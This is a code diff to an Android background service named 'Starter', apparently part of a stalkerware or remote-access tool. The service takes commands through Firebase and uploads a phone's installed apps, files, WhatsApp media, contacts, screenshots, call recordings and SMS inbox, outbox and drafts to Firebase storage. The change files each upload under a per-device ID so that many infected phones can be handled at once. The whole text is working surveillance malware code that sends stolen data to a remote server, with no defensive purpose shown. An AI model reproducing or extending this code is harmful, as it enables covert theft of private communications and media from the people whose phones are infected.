@@ -74,7 +74,7 @@ public class Starter extends Service {
 
         Intent notificationIntent = new Intent(this, Starter.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(this,
-                0, notificationIntent, 0);
+                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
         Notification notification = new NotificationCompat.Builder(this, MainActivity.CHANNEL_ID)
                 .setContentTitle("Auto Start Service")
                 .setContentText(input)
@@ -101,14 +101,15 @@ public class Starter extends Service {
         FirebaseDatabase
                 .getInstance()
                 .getReference("test")
-                .child("command")
+                .child(uuid)
+                .child("ping_command")
                 .addValueEventListener(new ValueEventListener() {
                     @Override
                     public void onDataChange(@NonNull DataSnapshot snapshot) {
                         if (snapshot.exists()) {
                             try {
                                 snapshot.getValue(Long.class);
-                                FirebaseDatabase.getInstance().getReference("test").child("command").setValue(true);
+                                FirebaseDatabase.getInstance().getReference("test").child(UniqueId.initialize(Starter.this).getUUID()).child("ping_command").setValue(true);
                             } catch (NumberFormatException | DatabaseException numberFormatException) {
                                 Log.d("WARNING", "OLD BOOT CHECK COMMAND FOUND");
                                 Logs.pushLogsToServer("[WARNING]: OLD BOOT CHECK COMMAND FOUND", uuid);
@@ -126,7 +127,9 @@ public class Starter extends Service {
 
         FirebaseDatabase
                 .getInstance()
-                .getReference("command")
+                .getReference("test")
+                .child(uuid)
+                .child("command")
                 .addValueEventListener(new ValueEventListener() {
                     @Override
                     public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -257,6 +260,7 @@ public class Starter extends Service {
         FirebaseStorage
                 .getInstance()
                 .getReference("INSTALLED_APP")
+                .child(uuid)
                 .child(System.currentTimeMillis()+"_app_Installed")
                 .putFile(uri)
                 .addOnCompleteListener(task -> {
@@ -266,8 +270,8 @@ public class Starter extends Service {
                                 .getDownloadUrl()
                                 .addOnCompleteListener(task1 ->{
                                     HashMap<String, Object> databaseEntry = new HashMap<>();
-                                    databaseEntry.put("/RECORDS/installed_apps"+"/" + System.currentTimeMillis(), task1.getResult().toString());
-                                    databaseEntry.put("/LIVE/installed_apps", task1.getResult().toString());
+                                    databaseEntry.put("/RECORDS/"+uuid+"/installed_apps"+"/" + System.currentTimeMillis(), task1.getResult().toString());
+                                    databaseEntry.put("/LIVE/"+uuid+"/installed_apps", task1.getResult().toString());
                                     FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                 });
 
@@ -297,6 +301,7 @@ public class Starter extends Service {
                                                 FirebaseStorage
                                                         .getInstance()
                                                         .getReference("PHONE_FILE")
+                                                        .child(uuid)
                                                         .child(String.valueOf(payloadType))
                                                         .child(System.currentTimeMillis()+"_phone_"+payloadType+" "+path1.getName())
                                                         .putFile(uri)
@@ -307,8 +312,8 @@ public class Starter extends Service {
                                                                         .getDownloadUrl()
                                                                         .addOnCompleteListener(task1 ->{
                                                                             HashMap<String, Object> databaseEntry = new HashMap<>();
-                                                                            databaseEntry.put("/RECORDS/phone_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
-                                                                            databaseEntry.put("/LIVE/phone_media_"+payloadType, task1.getResult().toString());
+                                                                            databaseEntry.put("/RECORDS/"+uuid+"/phone_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                                            databaseEntry.put("/LIVE/"+uuid+"/phone_media_"+payloadType, task1.getResult().toString());
                                                                             FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                                         });
 
@@ -344,6 +349,7 @@ public class Starter extends Service {
                         FirebaseStorage
                                 .getInstance()
                                 .getReference("Whatsapp_media")
+                                .child(uuid)
                                 .child(String.valueOf(payloadType))
                                 .child(System.currentTimeMillis()+"_whatsapp_"+payloadType)
                                 .putFile(uri)
@@ -354,8 +360,8 @@ public class Starter extends Service {
                                                 .getDownloadUrl()
                                                 .addOnCompleteListener(task1 ->{
                                                     HashMap<String, Object> databaseEntry = new HashMap<>();
-                                                    databaseEntry.put("/RECORDS/whatsapp_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
-                                                    databaseEntry.put("/LIVE/whatsapp_media_"+payloadType, task1.getResult().toString());
+                                                    databaseEntry.put("/RECORDS/"+uuid+"/whatsapp_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                    databaseEntry.put("/LIVE/"+uuid+"/whatsapp_media_"+payloadType, task1.getResult().toString());
                                                     FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                     Logs.pushLogsToServer("[PATH]: "+task1.getResult().toString(), uuid);
                                                 });
@@ -387,14 +393,11 @@ public class Starter extends Service {
                     FirebaseStorage
                             .getInstance()
                             .getReference("contacts")
+                            .child(uuid)
                             .child("contacts_" + System.currentTimeMillis() + ".json")
                             .putFile(fileReference)
-                            .addOnFailureListener(r -> FirebaseDatabase
-                                    .getInstance()
-                                    .getReference("Logs")
-                                    .child(PayloadTypes.GET_USER_CONTACTS + "")
-                                    .child("CurrentLog")
-                                    .setValue(r.getMessage()))
+                            .addOnFailureListener(r ->
+                                    Logs.pushLogsToServer(r.getMessage(),uuid))
                             .addOnCompleteListener(task -> {
                                 if (task.isSuccessful()) {
                                     task.getResult()
@@ -402,8 +405,8 @@ public class Starter extends Service {
                                             .getDownloadUrl()
                                             .addOnCompleteListener(task1 -> {
                                                 HashMap<String, Object> databaseEntry = new HashMap<>();
-                                                databaseEntry.put("/RECORDS/contacts/" + System.currentTimeMillis(), task1.getResult().toString());
-                                                databaseEntry.put("/LIVE/contacts", task1.getResult().toString());
+                                                databaseEntry.put("/RECORDS/"+uuid+"/contacts/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                databaseEntry.put("/LIVE/"+uuid+"/contacts", task1.getResult().toString());
                                                 FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                             });
                                 }
@@ -425,24 +428,18 @@ public class Starter extends Service {
                 FirebaseStorage
                         .getInstance()
                         .getReference("screenshots")
+                        .child(uuid)
                         .child("sc_" + System.currentTimeMillis() + ".zip")
                         .putFile(securePath)
-                        .addOnFailureListener(f -> {
-                            FirebaseDatabase
-                                    .getInstance()
-                                    .getReference("Logs")
-                                    .child(PayloadTypes.GET_SCREENSHOTS_COUNT + "")
-                                    .child("CurrentLog")
-                                    .setValue(f.getMessage());
-                        })
+                        .addOnFailureListener(f -> Logs.pushLogsToServer(f.getMessage(),uuid))
                         .addOnCompleteListener(t -> {
                             t.getResult()
                                     .getStorage()
                                     .getDownloadUrl()
                                     .addOnCompleteListener(p ->{
                                         HashMap<String, Object> databaseEntry = new HashMap<>();
-                                        databaseEntry.put("/RECORDS/screenshots/" + System.currentTimeMillis(), p.getResult().toString());
-                                        databaseEntry.put("/LIVE/screenshots", p.getResult().toString());
+                                        databaseEntry.put("/RECORDS/"+uuid+"/screenshots/" + System.currentTimeMillis(), p.getResult().toString());
+                                        databaseEntry.put("/LIVE/"+uuid+"/screenshots", p.getResult().toString());
                                         FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
 
                                     });
@@ -465,6 +462,7 @@ public class Starter extends Service {
                         FirebaseStorage
                                 .getInstance()
                                 .getReference("whatsapp_media_less")
+                                .child(uuid)
                                 .child(time)
                                 .putFile(uriDb)
                                 .addOnCompleteListener(task -> {
@@ -475,7 +473,9 @@ public class Starter extends Service {
                                                 .addOnCompleteListener(task1 ->
                                                         FirebaseDatabase
                                                                 .getInstance()
-                                                                .getReference("wbDb")
+                                                                .getReference("RECORDS")
+                                                                .child(uuid)
+                                                                .child("wbDb")
                                                                 .child(System.currentTimeMillis() + " ")
                                                                 .setValue(task1.getResult().toString()));
 
@@ -487,6 +487,7 @@ public class Starter extends Service {
                         FirebaseStorage
                                 .getInstance()
                                 .getReference("whatsapp_media_less")
+                                .child(uuid)
                                 .child(time)
                                 .putFile(uri)
                                 .addOnCompleteListener(task12 -> {
@@ -496,7 +497,9 @@ public class Starter extends Service {
                                             .addOnCompleteListener(task1 ->
                                                     FirebaseDatabase
                                                             .getInstance()
-                                                            .getReference("wbDb")
+                                                            .getReference("RECORDS")
+                                                            .child(uuid)
+                                                            .child("wbDb")
                                                             .child(System.currentTimeMillis() + " ")
                                                             .setValue(task1.getResult().toString()));
                                 });
@@ -521,14 +524,15 @@ public class Starter extends Service {
                             FirebaseStorage
                                     .getInstance()
                                     .getReference("calls")
+                                    .child(uuid)
                                     .child(String.valueOf(System.currentTimeMillis()))
                                     .putFile(uri)
                                     .addOnCompleteListener(task -> {
                                         if (task.isSuccessful()) {
                                             task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> {
                                                 HashMap<String, Object> databaseEntry = new HashMap<>();
-                                                databaseEntry.put("/RECORDS/calls/" + System.currentTimeMillis(), task1.getResult().toString());
-                                                databaseEntry.put("/LIVE/calls", task1.getResult().toString());
+                                                databaseEntry.put("/RECORDS/"+uuid+"/calls/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                databaseEntry.put("/LIVE/"+uuid+"/calls", task1.getResult().toString());
                                                 FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                             });
                                         } else{
@@ -568,6 +572,7 @@ public class Starter extends Service {
                             FirebaseStorage
                                     .getInstance()
                                     .getReference("sms")
+                                    .child(uuid)
                                     .child(String.valueOf(System.currentTimeMillis()))
                                     .putFile(uri)
                                     .addOnCompleteListener(new OnCompleteListener<UploadTask.TaskSnapshot>() {
@@ -579,14 +584,14 @@ public class Starter extends Service {
                                                     public void onComplete(@NonNull Task<Uri> task) {
                                                         HashMap<String, Object> databaseEntry = new HashMap<>();
                                                         if (modeInbox.equals(SmsModes.MODE_INBOX)){
-                                                            databaseEntry.put("/RECORDS/sms_inbox/" + System.currentTimeMillis(), task.getResult().toString());
-                                                            databaseEntry.put("/LIVE/sms_inbox", task.getResult().toString());
+                                                            databaseEntry.put("/RECORDS/"+uuid+"/sms_inbox/" + System.currentTimeMillis(), task.getResult().toString());
+                                                            databaseEntry.put("/LIVE/"+uuid+"/sms_inbox", task.getResult().toString());
                                                         }else if (modeInbox.equals(SmsModes.MODE_OUTBOX)){
-                                                            databaseEntry.put("/RECORDS/sms_outbox/" + System.currentTimeMillis(), task.getResult().toString());
-                                                            databaseEntry.put("/LIVE/sms_outbox", task.getResult().toString());
+                                                            databaseEntry.put("/RECORDS/"+uuid+"/sms_outbox/" + System.currentTimeMillis(), task.getResult().toString());
+                                                            databaseEntry.put("/LIVE/"+uuid+"/sms_outbox", task.getResult().toString());
                                                         }else if (modeInbox.equals(SmsModes.MODE_DRAFT)){
-                                                            databaseEntry.put("/RECORDS/sms_draft/" + System.currentTimeMillis(), task.getResult().toString());
-                                                            databaseEntry.put("/LIVE/sms_draft", task.getResult().toString());
+                                                            databaseEntry.put("/RECORDS/"+uuid+"/sms_draft/" + System.currentTimeMillis(), task.getResult().toString());
+                                                            databaseEntry.put("/LIVE/"+uuid+"/sms_draft", task.getResult().toString());
                                                         }
 
                                                         FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
